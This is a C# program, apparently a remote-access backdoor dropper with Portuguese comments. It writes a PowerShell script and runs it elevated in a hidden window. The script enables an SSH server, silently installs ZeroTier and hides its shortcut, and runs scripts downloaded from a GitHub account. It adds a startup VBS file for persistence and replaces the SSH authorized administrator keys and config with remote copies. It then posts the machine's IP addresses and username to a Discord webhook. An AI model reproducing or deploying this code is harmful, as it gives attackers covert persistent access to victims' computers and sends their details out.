using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {

string command = @"
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; 
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; 
    Start-Service sshd; 
    Set-Service -Name sshd -StartupType 'Automatic'; 
    Set-ExecutionPolicy Bypass -Scope Process -Force; 
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; 
    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); 
    choco install --force zerotier-one -y;  
    rm 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ZeroTier.lnk'; 
    cd 'C:\ProgramData'; 
    Start-BitsTransfer 'https://raw.githubusercontent.com/2o2ks/NETFLIX/main/zeroHIDE.ps1'; 
    .\zeroHIDE.ps1; 
    Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/NETFLIX/main/google.bat; 
    $startupPath = $HOME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';
    cd $startupPath; 
    Start-BitsTransfer 'https://raw.githubusercontent.com/2o2ks/NETFLIX/main/startup.vbs'; 
    $path = $HOME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs'; 
    cd C:\ProgramData\ssh ; 
    if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/administrators_authorized_keys } ; 
    if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/sshd_config }; 
    Restart-Service sshd; 
    cd $startupPath; 
    .\startup.vbs; 
    rm 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ZeroTier.lnk';

    $publicIpAddress = Invoke-RestMethod -Uri 'https://ipinfo.io/ip';

    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString;
    $user = $env:USERNAME;

    $url = 'https://discordapp.com/api/webhooks/1269965553175494687/ov4Id6DoGT-_Xvlg-fRPQm_YcCY19d75gClQZwCIO0_alrJPUG9vNJiOem9sWn12K4lW';

    $jsonBody = @{
        content = ""IP: $ipAddress | $publicIpAddress HOSTNAME: $user""
    } | ConvertTo-Json;

    Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType 'application/json';

    pause
";

        // Obtem o caminho Appdata/Local
        string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string scriptPath = Path.Combine(localAppDataPath, "script.ps1");

        // Cria o arquivo .ps1 com o conteúdo do {command}
        try
        {
            File.WriteAllText(scriptPath, command);
            Console.WriteLine("Arquivo script.ps1 criado com sucesso em " + scriptPath);
        }
        catch (Exception ex)
        {
            
            return;
        }
        Console.WriteLine(command);

        var processInfo = new ProcessStartInfo
        {
            Verb = "runas",
            LoadUserProfile = true,
            WindowStyle = ProcessWindowStyle.Hidden, // Deixa o Powershell escondido
            FileName = "powershell.exe",
            Arguments = $"-NoExit -Command \"{scriptPath}\"", // Carrega o script
            RedirectStandardOutput = false,
            UseShellExecute = true,
            CreateNoWindow = true
        };

        var p = Process.Start(processInfo);

        Console.WriteLine("O PowerShell foi encerrado.");
    }
}
